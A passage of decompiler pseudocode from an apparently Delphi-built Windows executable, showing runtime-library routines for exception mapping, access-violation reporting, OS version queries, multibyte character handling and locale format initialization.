  v9 = (int *)&loc_409605;
  sub_40426C(&v11);
  if ( v5 )
    sub_4038BC((_DWORD *)v6);
  return v6;
}
// 4095BA: variable 'a2' is possibly undefined
// 4095D8: variable 'a3' is possibly undefined

//----- (00409624) --------------------------------------------------------
_DWORD *__usercall sub_409624@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>)
{
  char v3; // bl
  _DWORD *v4; // edi
  char v6; // [esp-10h] [ebp-1Ch]

  if ( a2 )
    a1 = sub_403864(a1, a2, v6);
  v3 = a2;
  v4 = (_DWORD *)a1;
  sub_4063D4(a3, (char **)(a1 + 4));
  if ( v3 )
    sub_4038BC(v4);
  return v4;
}
// 40962E: variable 'v6' is possibly undefined
// 409635: variable 'a2' is possibly undefined
// 40963E: variable 'a3' is possibly undefined

//----- (00409660) --------------------------------------------------------
int __userpurge sub_409660@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>, int a4, int a5)
{
  char v5; // bl
  int v6; // edi
  unsigned int v8[2]; // [esp-28h] [ebp-30h] BYREF
  int *v9; // [esp-20h] [ebp-28h]
  char v10; // [esp-1Ch] [ebp-24h]
  char *v11; // [esp+0h] [ebp-8h] BYREF
  char *v12; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  if ( a2 )
    a1 = sub_403864(a1, a2, v10);
  v5 = a2;
  v6 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4096CC;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_4063D4(a3, &v11);
  sub_408758((int)v11, a5, a4, &v12);
  sub_4042C0((volatile __int32 *)(v6 + 4), (__int32)v12);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4096D3;
  sub_404290((int)&v11, 2);
  if ( v5 )
    sub_4038BC((_DWORD *)v6);
  return v6;
}
// 409678: variable 'a2' is possibly undefined
// 409693: variable 'a3' is possibly undefined

//----- (004096F4) --------------------------------------------------------
int __usercall sub_4096F4@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)(result + 12) )
    return sub_4034E8(result);
  return result;
}

//----- (00409720) --------------------------------------------------------
_DWORD *sub_409720()
{
  int v0; // ebx
  int v1; // eax
  int v2; // esi
  _DWORD *result; // eax
  int v4; // [esp+0h] [ebp-10h] BYREF
  char v5; // [esp+4h] [ebp-Ch]

  v0 = 0;
  v1 = sub_402824();
  v2 = v1;
  while ( v0 <= 6 && v1 != dword_42B1C0[2 * v0] )
    ++v0;
  if ( v0 > 6 )
  {
    v4 = v1;
    v5 = 0;
    result = (_DWORD *)sub_409660((int)dword_406FA8, 1, off_42B884, 0, (int)&v4);
  }
  else
  {
    result = sub_409568((int)dword_406FA8, 1, dword_42B1C4[2 * v0]);
  }
  result[3] = v2;
  return result;
}
// 406FA8: using guessed type int dword_406FA8[3];
// 42B1C0: using guessed type int dword_42B1C0[];
// 42B1C4: using guessed type int dword_42B1C4[];
// 42B884: using guessed type int **off_42B884;

//----- (004097A0) --------------------------------------------------------
int __usercall sub_4097A0@<eax>(unsigned __int8 a1@<al>, int a2, int a3, int a4, int a5)
{
  _DWORD *v5; // edx

  if ( a1 == 1 )
  {
    v5 = (_DWORD *)dword_42C83C;
  }
  else if ( a1 == 2 )
  {
    v5 = (_DWORD *)dword_42C840;
  }
  else if ( (unsigned __int8)(a1 - 3) < 0x16u )
  {
    v5 = sub_409568(dword_42B1E0[2 * a1], 1, dword_42B1E0[2 * a1 + 1]);
  }
  else
  {
    v5 = sub_409720();
  }
  return sub_403CCC((int)v5, a2, a3, a4, a5);
}
// 42B1E0: using guessed type int dword_42B1E0[];
// 42C83C: using guessed type int dword_42C83C;
// 42C840: using guessed type int dword_42C840;

//----- (004097F4) --------------------------------------------------------
int __usercall sub_4097F4@<eax>(__int32 a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v8; // [esp-4h] [ebp-30h]
  char *v9; // [esp+Ch] [ebp-20h] BYREF
  char *v10; // [esp+10h] [ebp-1Ch] BYREF
  char v11; // [esp+14h] [ebp-18h]
  int v12; // [esp+18h] [ebp-14h]
  char v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+20h] [ebp-Ch]
  char v15; // [esp+24h] [ebp-8h]
  char *v16; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v9 = 0;
  v16 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_409890;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( a1 )
    sub_404304((volatile __int32 *)&v16, a1);
  else
    sub_4063D4(off_42B9D4, &v16);
  v10 = v16;
  v11 = 11;
  v12 = a2;
  v13 = 11;
  v14 = a3;
  v15 = 0;
  sub_4063D4(off_42BA1C[0], &v9);
  v5 = sub_4095A4((int)dword_4076B0, 1, (int)v9, 2, (int)&v10);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_409897;
  sub_40426C(&v9);
  sub_40426C(&v16);
  return v5;
}
// 4076B0: using guessed type int dword_4076B0[5];
// 42B9D4: using guessed type int **off_42B9D4;
// 42BA1C: using guessed type int **off_42BA1C[3];

//----- (004098A0) --------------------------------------------------------
int __usercall sub_4098A0@<eax>(int a1@<eax>, int a2, int a3, int a4, int a5)
{
  return sub_403CCC(a1, a2, a3, a4, a5);
}

//----- (004098B0) --------------------------------------------------------
#error "4098C1: call analysis failed (funcsize=9)"

//----- (004098E4) --------------------------------------------------------
char __usercall sub_4098E4@<al>(int *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax

  v1 = *a1;
  if ( v1 > -1073741678 )
  {
    if ( v1 > -1073741674 )
    {
      v9 = v1 + 1073741571;
      if ( !v9 )
        return 14;
      if ( v9 == 61 )
        return 13;
    }
    else
    {
      if ( v1 == -1073741674 )
        return 12;
      v7 = v1 + 1073741677;
      if ( !v7 )
        return 9;
      v8 = v7 - 1;
      if ( !v8 )
        return 3;
      if ( v8 == 1 )
        return 5;
    }
  }
  else
  {
    if ( v1 == -1073741678 )
      return 6;
    if ( v1 <= -1073741682 )
    {
      if ( v1 == -1073741682 )
        return 7;
      v2 = v1 + 1073741819;
      if ( !v2 )
        return 11;
      v3 = v2 - 135;
      if ( !v3 )
        return 4;
      if ( v3 != 1 )
        return 22;
      return 9;
    }
    v4 = v1 + 1073741681;
    v5 = v4 < 2;
    v6 = v4 - 2;
    if ( v5 )
      return 6;
    if ( !v6 )
      return 8;
  }
  return 22;
}

//----- (00409964) --------------------------------------------------------
int __usercall sub_409964@<eax>(int *a1@<eax>)
{
  return dword_42B1E0[2 * (unsigned __int8)sub_4098E4(a1)];
}
// 42B1E0: using guessed type int dword_42B1E0[];

//----- (0040997C) --------------------------------------------------------
int __cdecl sub_40997C(int a1)
{
  int v1; // ebx
  int v2; // esi
  int v3; // ebx
  unsigned int v5[2]; // [esp-Ch] [ebp-184h] BYREF
  int *v6; // [esp-4h] [ebp-17Ch]
  char *v7; // [esp+8h] [ebp-170h] BYREF
  int v8; // [esp+Ch] [ebp-16Ch] BYREF
  char v9; // [esp+10h] [ebp-168h]
  char *v10; // [esp+14h] [ebp-164h]
  char v11; // [esp+18h] [ebp-160h]
  int v12; // [esp+1Ch] [ebp-15Ch]
  char v13; // [esp+20h] [ebp-158h]
  char *v14; // [esp+24h] [ebp-154h] BYREF
  char *v15; // [esp+28h] [ebp-150h] BYREF
  char *v16; // [esp+2Ch] [ebp-14Ch] BYREF
  int v17; // [esp+30h] [ebp-148h] BYREF
  char v18; // [esp+34h] [ebp-144h]
  char *v19; // [esp+38h] [ebp-140h]
  char v20; // [esp+3Ch] [ebp-13Ch]
  char *v21; // [esp+40h] [ebp-138h]
  char v22; // [esp+44h] [ebp-134h]
  int v23; // [esp+48h] [ebp-130h]
  char v24; // [esp+4Ch] [ebp-12Ch]
  CHAR Filename[261]; // [esp+53h] [ebp-125h] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+158h] [ebp-20h] BYREF
  char *v27; // [esp+174h] [ebp-4h] BYREF
  int savedregs; // [esp+178h] [ebp+0h] BYREF

  v7 = 0;
  v16 = 0;
  v14 = 0;
  v15 = 0;
  v27 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_409B37;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = *(_DWORD *)(a1 - 4);
  if ( *(_DWORD *)(v1 + 20) )
    sub_4063D4(off_42B9BC, &v27);
  else
    sub_4063D4(off_42BA98[0], &v27);
  v2 = *(_DWORD *)(v1 + 24);
  VirtualQuery_0(*(LPCVOID *)(v1 + 12), &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_0((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v17 = *(_DWORD *)(v1 + 12);
    v18 = 5;
    sub_4044D4(&v15, Filename, 261);
    sub_408044(v15, &v16);
    v19 = v16;
    v20 = 11;
    v21 = v27;
    v22 = 11;
    v23 = v2;
    v24 = 5;
    sub_4063D4(off_42BA00[0], &v14);
    v3 = sub_4095A4((int)dword_4074E8, 1, (int)v14, 3, (int)&v17);
  }
  else
  {
    v8 = *(_DWORD *)(v1 + 12);
    v9 = 5;
    v10 = v27;
    v11 = 11;
    v12 = v2;
    v13 = 5;
    sub_4063D4(off_42BA38, &v7);
    v3 = sub_4095A4((int)dword_4074E8, 1, (int)v7, 2, (int)&v8);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_409B3E;
  sub_40426C(&v7);
  sub_404290((int)&v14, 3);
  sub_40426C(&v27);
  return v3;
}
// 4074E8: using guessed type int dword_4074E8[5];
// 42B9BC: using guessed type int **off_42B9BC;
// 42BA00: using guessed type int **off_42BA00[2];
// 42BA38: using guessed type int **off_42BA38;
// 42BA98: using guessed type int **off_42BA98[2];

//----- (00409B48) --------------------------------------------------------
int *__usercall sub_409B48@<eax>(int *a1@<eax>)
{
  int v1; // eax
  int *v2; // ebx
  unsigned int v4[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v5; // [esp-4h] [ebp-18h]
  char *v6; // [esp+4h] [ebp-10h] BYREF
  int v7; // [esp+8h] [ebp-Ch] BYREF
  char v8; // [esp+Ch] [ebp-8h]
  int *v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = 0;
  v9 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_409C03;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v1 = (unsigned __int8)sub_4098E4(a1);
  if ( (unsigned int)(v1 - 3) < 8 )
    goto LABEL_4;
  if ( v1 == 11 )
  {
    v2 = (int *)sub_40997C((int)&savedregs);
  }
  else
  {
    if ( (unsigned int)(v1 - 12) < 0xA )
    {
LABEL_4:
      v2 = sub_409568(dword_42B1E0[2 * v1], 1, dword_42B1E0[2 * v1 + 1]);
      goto LABEL_7;
    }
    v7 = *v9;
    v8 = 0;
    sub_4063D4(off_42B83C[0], &v6);
    v2 = (int *)sub_4095A4((int)dword_407058, 1, (int)v6, 0, (int)&v7);
  }
LABEL_7:
  if ( sub_4036C0(v2, (int)dword_407000) )
    v2[3] = (int)v9;
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_409C0A;
  sub_40426C(&v6);
  return v2;
}
// 407000: using guessed type int dword_407000[3];
// 407058: using guessed type int dword_407058[5];
// 42B1E0: using guessed type int dword_42B1E0[];
// 42B83C: using guessed type int **off_42B83C[2];

//----- (00409C24) --------------------------------------------------------
int (*sub_409C24())()
{
  int (*result)(); // eax

  dword_42C83C = (int)sub_409624((int)dword_406F4C, 1, off_42B890[0]);
  dword_42C840 = (int)sub_409624((int)dword_4073D4, 1, off_42B99C[0]);
  *off_42B844 = (int)sub_4097A0;
  *off_42B8DC[0] = (int)sub_409C14;
  *(_DWORD *)off_42B880 = dword_406E88;
  *off_42B8C8 = (int)sub_409964;
  *off_42B8E8 = (int)sub_409B48;
  *(_DWORD *)off_42B9B4 = sub_4098B0;
  result = sub_4098CC;
  *off_42B834 = (int)sub_4098CC;
  return result;
}
// 406E88: using guessed type int dword_406E88[2];
// 406F4C: using guessed type int dword_406F4C[4];
// 4073D4: using guessed type int dword_4073D4[4];
// 4098B0: using guessed type _DWORD __stdcall sub_4098B0(_DWORD);
// 4098CC: using guessed type int sub_4098CC();
// 409C14: using guessed type int sub_409C14();
// 42B834: using guessed type int *off_42B834;
// 42B844: using guessed type int *off_42B844;
// 42B880: using guessed type void *off_42B880;
// 42B890: using guessed type int **off_42B890[6];
// 42B8C8: using guessed type int *off_42B8C8;
// 42B8DC: using guessed type int *off_42B8DC[2];
// 42B8E8: using guessed type int *off_42B8E8;
// 42B99C: using guessed type int **off_42B99C[4];
// 42B9B4: using guessed type void *off_42B9B4;
// 42C83C: using guessed type int dword_42C83C;
// 42C840: using guessed type int dword_42C840;

//----- (00409CA8) --------------------------------------------------------
void *sub_409CA8()
{
  void *result; // eax

  *(_BYTE *)(dword_42C83C + 12) = 1;
  (*(void (**)(void))(*(_DWORD *)dword_42C83C - 8))();
  dword_42C83C = 0;
  *(_BYTE *)(dword_42C840 + 12) = 1;
  sub_403534((_DWORD *)dword_42C840);
  dword_42C840 = 0;
  *off_42B844 = 0;
  *off_42B8DC[0] = 0;
  *(_DWORD *)off_42B880 = 0;
  *off_42B8C8 = 0;
  *off_42B8E8 = 0;
  result = off_42B9B4;
  *(_DWORD *)off_42B9B4 = 0;
  return result;
}
// 42B844: using guessed type int *off_42B844;
// 42B880: using guessed type void *off_42B880;
// 42B8C8: using guessed type int *off_42B8C8;
// 42B8DC: using guessed type int *off_42B8DC[2];
// 42B8E8: using guessed type int *off_42B8E8;
// 42B9B4: using guessed type void *off_42B9B4;
// 42C83C: using guessed type int dword_42C83C;
// 42C840: using guessed type int dword_42C840;

//----- (00409D14) --------------------------------------------------------
_DWORD *sub_409D14()
{
  _DWORD *result; // eax
  struct _OSVERSIONINFOA v1; // [esp+0h] [ebp-94h] BYREF

  v1.dwOSVersionInfoSize = 148;
  result = (_DWORD *)GetVersionExA(&v1);
  if ( result )
  {
    dword_42B0AC = v1.dwPlatformId;
    dword_42B0B0 = v1.dwMajorVersion;
    dword_42B0B4 = v1.dwMinorVersion;
    dword_42B0B8 = v1.dwBuildNumber;
    return sub_4044D4((char **)&dword_42B0BC, v1.szCSDVersion, 128);
  }
  return result;
}
// 42B0AC: using guessed type int dword_42B0AC;
// 42B0B0: using guessed type int dword_42B0B0;
// 42B0B4: using guessed type int dword_42B0B4;
// 42B0B8: using guessed type int dword_42B0B8;
// 42B0BC: using guessed type _DWORD dword_42B0BC;

//----- (00409D6C) --------------------------------------------------------
int __usercall sub_409D6C@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  int i; // esi

  v3 = 0;
  if ( a1 && a1[a2] )
  {
    if ( a2 )
    {
      for ( i = a2 - 1; i >= 0 && _bittest(&dword_42B0C0, a1[i]); --i )
        ;
      if ( (a2 - i) % 2 )
      {
        if ( _bittest(&dword_42B0C0, a1[a2]) )
          LOBYTE(v3) = 1;
      }
      else
      {
        LOBYTE(v3) = 2;
      }
    }
    else if ( _bittest(&dword_42B0C0, *a1) )
    {
      LOBYTE(v3) = 1;
    }
  }
  return v3;
}
// 42B0C0: using guessed type int dword_42B0C0;

//----- (00409DE4) --------------------------------------------------------
int __usercall sub_409DE4@<eax>(char *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  unsigned __int8 *v5; // eax

  result = 0;
  if ( (_BYTE)dword_42C7F4 )
  {
    v5 = (unsigned __int8 *)sub_40471C(a1);
    return sub_409D6C(v5, a2 - 1);
  }
  return result;
}
// 42C7F4: using guessed type int dword_42C7F4;

//----- (00409E08) --------------------------------------------------------
int __usercall sub_409E08@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( (_BYTE)dword_42C7F4 )
    return sub_409D6C(a1, a2);
  return v2;
}
// 42C7F4: using guessed type int dword_42C7F4;

//----- (00409E20) --------------------------------------------------------
int __usercall sub_409E20@<eax>(const CHAR *a1@<eax>)
{
  if ( (_BYTE)dword_42C7F4 )
    return CharNextA_0(a1) - a1;
  else
    return 1;
}
// 42C7F4: using guessed type int dword_42C7F4;

//----- (00409E40) --------------------------------------------------------
int __usercall sub_409E40@<eax>(char *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  char *v5; // eax

  result = 1;
  if ( LOBYTE(dword_42C7F4[0]) )
  {
    if ( _bittest(&dword_42B0C0, (unsigned __int8)a1[a2 - 1]) )
    {
      v5 = sub_40471C(a1);
      return sub_409E20(&v5[a2 - 1]);
    }
  }
  return result;
}
// 42B0C0: using guessed type int dword_42B0C0;
// 42C7F4: using guessed type int dword_42C7F4[];

//----- (00409E7C) --------------------------------------------------------
int __usercall sub_409E7C@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  int v3; // edi
  char *v4; // ebp
  const char *v5; // eax
  char *v7; // [esp-4h] [ebp-14h]

  v3 = 0;
  v7 = sub_40471C(a1);
  v4 = sub_40471C(a2);
  v5 = sub_409EB4(v4, v7);
  if ( v5 )
    return v5 - v4 + 1;
  return v3;
}

//----- (00409EB4) --------------------------------------------------------
const char *__usercall sub_409EB4@<eax>(char *a1@<eax>, const char *a2@<edx>)
{
  const char *i; // ebx
  unsigned int v5; // edi
  unsigned int v7; // [esp+0h] [ebp-18h]
  char v8; // [esp+4h] [ebp-14h]

  i = 0;
  if ( a1 && *a1 && a2 && *a2 )
  {
    v7 = sub_4080F0(a1);
    v5 = sub_4080F0(a2);
    for ( i = sub_4081F8(a1, a2); i && v5 <= v7 - (i - a1); i = sub_4081F8(i + 1, a2) )
    {
      v8 = sub_409E08((unsigned __int8 *)a1, i - a1);
      if ( v8 != 2 && CompareStringA(0x400u, 0, i, v5, a2, v5) == 2 )
        return i;
      if ( v8 == 1 )
        ++i;
    }
    return 0;
  }
  return i;
}

//----- (00409F54) --------------------------------------------------------
_BYTE *__usercall sub_409F54@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *v3; // eax
  _BYTE *v4; // esi

  v3 = sub_409F7C(a1, a2);
  v4 = v3;
  if ( a2 && v3 )
  {
    do
    {
      v4 = v3;
      v3 = sub_409F7C(v3 + 1, a2);
    }
    while ( v3 );
  }
  return v4;
}

//----- (00409F7C) --------------------------------------------------------
_BYTE *__usercall sub_409F7C@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *i; // edi
  char v5; // al
  bool v6; // cf
  char v7; // al

  for ( i = sub_4081D8(a1, a2); i; i = sub_4081D8(i + 1, a2) )
  {
    v5 = sub_409E08(a1, i - a1);
    v6 = v5 == 0;
    v7 = v5 - 1;
    if ( v6 )
      break;
    if ( !v7 )
      ++i;
  }
  return i;
}

//----- (00409FBC) --------------------------------------------------------
int __usercall sub_409FBC@<eax>(LCID a1@<eax>)
{
  int ACP; // eax
  char *v2; // ecx
  int v3; // ebx
  char *v5; // [esp-10h] [ebp-20h]
  unsigned int v6[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v7; // [esp-4h] [ebp-14h]
  char *v8; // [esp+4h] [ebp-Ch] BYREF
  CHAR LCData[7]; // [esp+9h] [ebp-7h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v8 = 0;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40A020;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  GetLocaleInfoA_0(a1, 0x1004u, LCData, 7);
  sub_4044D4(&v8, LCData, 7);
  v5 = v8;
  ACP = GetACP();
  v3 = sub_407C64((int)v5, ACP, v2);
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40A027;
  sub_40426C(&v8);
  return v3;
}
// 40A003: variable 'v2' is possibly undefined
// 409FBC: using guessed type char *var_C;

//----- (0040A030) --------------------------------------------------------
unsigned __int8 __cdecl sub_40A030(int a1)
{
  int v1; // edi
  int v2; // eax
  unsigned __int8 result; // al
  int i; // esi
  unsigned __int8 v5; // bl
  bool v6; // cf
  char v7; // bl
  char v8; // bl
  unsigned __int8 v9; // [esp+Fh] [ebp-1h]

  v1 = a1 - 20;
  v2 = sub_409FBC(Locale);
  result = GetCPInfo(v2, (LPCPINFO)(a1 - 20));
  for ( i = 0; i < 12; i += 2 )
  {
    result = *(_BYTE *)(v1 + i + 7) | *(_BYTE *)(v1 + i + 6);
    if ( !*(_WORD *)(v1 + i + 6) )
      break;
    result = *(_BYTE *)(v1 + i + 6);
    v5 = *(_BYTE *)(v1 + i + 7);
    v6 = v5 < result;
    v7 = v5 - result;
    if ( !v6 )
    {
      v8 = v7 + 1;
      v9 = *(_BYTE *)(v1 + i + 6);
      do
      {
        result = v9;
        _bittestandset(&dword_42B0C0, v9++);
        --v8;
      }
      while ( v8 );
    }
  }
  return result;
}
// 42B0C0: using guessed type int dword_42B0C0;

//----- (0040A090) --------------------------------------------------------
unsigned __int8 sub_40A090()
{
  bool v0; // cf

  v0 = (unsigned int)dword_42C7EC < 0x1F;
  if ( (unsigned int)dword_42C7EC <= 0x1F )
    return _bittest(&dword_42B2A8, dword_42C7EC);
  return v0;
}
// 42B2A8: using guessed type int dword_42B2A8;
// 42C7EC: using guessed type int dword_42C7EC;

//----- (0040A0A8) --------------------------------------------------------
char sub_40A0A8()
{
  LCID ThreadLocale_0; // eax
  int SystemMetrics; // eax
  char v2; // zf
  int v3; // eax
  CHAR *v4; // edx
  WORD *v5; // edx
  WORD CharType[129]; // [esp+Eh] [ebp-196h] BYREF
  CHAR SrcStr[148]; // [esp+110h] [ebp-94h] BYREF
  int savedregs; // [esp+1A4h] [ebp+0h] BYREF

  Locale = 1033;
  dword_42C7EC = 9;
  dword_42C7F0 = 1;
  ThreadLocale_0 = GetThreadLocale_0();
  if ( ThreadLocale_0 )
    Locale = ThreadLocale_0;
  if ( (_WORD)ThreadLocale_0 )
  {
    dword_42C7EC = ThreadLocale_0 & 0x3FF;
    dword_42C7F0 = (unsigned __int16)ThreadLocale_0 >> 10;
  }
  qmemcpy(&dword_42B0C0, dword_40A1FC, 0x20u);
  if ( dword_42B0AC == 2 )
  {
    LOBYTE(SystemMetrics) = sub_40A090();
    if ( (_BYTE)SystemMetrics )
    {
      LOWORD(dword_42C7F4[0]) = 0;
    }
    else
    {
      sub_40A030((int)&savedregs);
      LOBYTE(SystemMetrics) = (unsigned __int8)sub_403078(&dword_42B0C0, dword_40A1FC, 0x20u);
      LOBYTE(dword_42C7F4[0]) = !v2;
      if ( v2 )
      {
        v3 = 128;
        v4 = SrcStr;
        do
          *v4++ = v3++;
        while ( v3 != 256 );
        GetStringTypeExA(Locale, 2u, SrcStr, 128, CharType);
        SystemMetrics = 128;
        v5 = CharType;
        do
        {
          BYTE1(dword_42C7F4[0]) = *v5 == 2;
          if ( BYTE1(dword_42C7F4[0]) )
            break;
          ++v5;
          --SystemMetrics;
        }
        while ( SystemMetrics );
      }
      else
      {
        BYTE1(dword_42C7F4[0]) = 0;
      }
    }
  }
  else
  {
    BYTE1(dword_42C7F4[0]) = GetSystemMetrics(74) != 0;
    SystemMetrics = GetSystemMetrics(42);
    LOBYTE(dword_42C7F4[0]) = SystemMetrics != 0;
    if ( SystemMetrics )
      LOBYTE(SystemMetrics) = sub_40A030((int)&savedregs);
  }
  return SystemMetrics;
}
// 40A155: variable 'v2' is possibly undefined
// 40A1FC: using guessed type int dword_40A1FC[8];
// 42B0AC: using guessed type int dword_42B0AC;
// 42B0C0: using guessed type int dword_42B0C0;
// 42C7EC: using guessed type int dword_42C7EC;
// 42C7F0: using guessed type int dword_42C7F0;
// 42C7F4: using guessed type int dword_42C7F4[];

//----- (0040A21C) --------------------------------------------------------
int __usercall sub_40A21C@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LCID ThreadLocale_0; // ebx
  char *v4; // ecx
  char *v5; // ecx
  int v6; // ecx
  int v7; // ecx
  char *v8; // ecx
  int v9; // ecx
  int v10; // ecx
  char *v11; // ecx
  char *v12; // ecx
  char *v13; // ecx
  int v14; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-50h] BYREF
  void *v17; // [esp-8h] [ebp-4Ch]
  int *v18; // [esp-4h] [ebp-48h]
  void *v19; // [esp+0h] [ebp-44h]
  __int32 v20; // [esp+4h] [ebp-40h] BYREF
  __int32 v21; // [esp+8h] [ebp-3Ch] BYREF
  __int32 v22; // [esp+Ch] [ebp-38h] BYREF
  __int32 v23; // [esp+10h] [ebp-34h] BYREF
  __int32 v24; // [esp+14h] [ebp-30h] BYREF
  char *v25; // [esp+18h] [ebp-2Ch] BYREF
  char *v26; // [esp+1Ch] [ebp-28h] BYREF
  char *v27; // [esp+20h] [ebp-24h] BYREF
  char *v28; // [esp+24h] [ebp-20h] BYREF
  __int32 v29; // [esp+28h] [ebp-1Ch] BYREF
  __int32 v30; // [esp+2Ch] [ebp-18h] BYREF
  __int32 v31; // [esp+30h] [ebp-14h] BYREF
  __int32 v32; // [esp+34h] [ebp-10h] BYREF
  __int32 v33; // [esp+38h] [ebp-Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v34; // [esp+3Ch] [ebp-8h] BYREF
  __int32 v35; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  v18 = &savedregs;
  v17 = &loc_40A4E7;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_40A0A8();
  sub_408E70(a1, a2, a3);
  if ( LOBYTE(dword_42C7F4[0]) )
    sub_409048();
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408DC0(ThreadLocale_0, 0x14u, 0, &v32);
  sub_4042C0(&dword_42C728, v32);
  sub_408DC0(ThreadLocale_0, 0x1Bu, (__int32)dword_40A4FC, &v31);
  byte_42C72C = sub_407C64(v31, 0, v4);
  sub_408DC0(ThreadLocale_0, 0x1Cu, (__int32)dword_40A4FC, &v30);
  byte_42C72D = sub_407C64(v30, 0, v5);
  LOBYTE(v6) = 44;
  byte_42C72E = sub_408E0C(ThreadLocale_0, 0xFu, v6);
  LOBYTE(v7) = 46;
  byte_42C72F = sub_408E0C(ThreadLocale_0, 0xEu, v7);
  sub_408DC0(ThreadLocale_0, 0x19u, (__int32)dword_40A4FC, &v29);
  byte_42C730 = sub_407C64(v29, 0, v8);
  LOBYTE(v9) = 47;
  byte_42C731 = sub_408E0C(ThreadLocale_0, 0x1Du, v9);
  sub_408DC0(ThreadLocale_0, 0x1Fu, (__int32)"m/d/yy", (volatile __int32 *)&v27);
  sub_4090F8(v27, &v28, ThreadLocale_0, a2, a3);
  sub_4042C0(&dword_42C734, (__int32)v28);
  sub_408DC0(ThreadLocale_0, 0x20u, (__int32)"mmmm d, yyyy", (volatile __int32 *)&v25);
  sub_4090F8(v25, &v26, ThreadLocale_0, a2, a3);
  sub_4042C0(&dword_42C738, (__int32)v26);
  LOBYTE(v10) = 58;
  byte_42C73C = sub_408E0C(ThreadLocale_0, 0x1Eu, v10);
  sub_408DC0(ThreadLocale_0, 0x28u, (__int32)dword_40A530, &v24);
  sub_4042C0(&dword_42C740, v24);
  sub_408DC0(ThreadLocale_0, 0x29u, (__int32)dword_40A53C, &v23);
  sub_4042C0(&dword_42C744, v23);
  sub_40426C(&v34);
  sub_40426C(&v33);
  sub_408DC0(ThreadLocale_0, 0x25u, (__int32)dword_40A4FC, &v22);
  if ( sub_407C64(v22, 0, v11) )
    sub_404304(&v35, (__int32)dword_40A554);
  else
    sub_404304(&v35, (__int32)dword_40A548);
  sub_408DC0(ThreadLocale_0, 0x23u, (__int32)dword_40A4FC, &v21);
  if ( !sub_407C64(v21, 0, v12) )
  {
    sub_408DC0(ThreadLocale_0, 0x1005u, (__int32)dword_40A4FC, &v20);
    if ( sub_407C64(v20, 0, v13) )
      sub_404304((volatile __int32 *)&v34, (__int32)"AMPM ");
    else
      sub_404304(&v33, (__int32)" AMPM");
  }
  sub_4045E4(&dword_42C748, 4);
  ExceptionList = v34;
  sub_4045E4(&dword_42C74C, 4);
  LOBYTE(v14) = 44;
  BYTE2(dword_42C7F4[0]) = sub_408E0C(ThreadLocale_0, 0xCu, v14);
  __writefsdword(0, (unsigned int)v17);
  v19 = &loc_40A4EE;
  return sub_404290((int)&v20, 16);
}
// 40A292: variable 'v4' is possibly undefined
// 40A2B6: variable 'v5' is possibly undefined
// 40A2C9: variable 'v6' is possibly undefined
// 40A2DC: variable 'v7' is possibly undefined
// 40A300: variable 'v8' is possibly undefined
// 40A313: variable 'v9' is possibly undefined
// 40A380: variable 'v10' is possibly undefined
// 40A3F8: variable 'v11' is possibly undefined
// 40A437: variable 'v12' is possibly undefined
// 40A45A: variable 'v13' is possibly undefined
// 40A4C2: variable 'v14' is possibly undefined
// 40A4FC: using guessed type int dword_40A4FC[3];
// 40A530: using guessed type int dword_40A530[3];
// 40A53C: using guessed type int dword_40A53C[3];
// 40A548: using guessed type int dword_40A548[3];
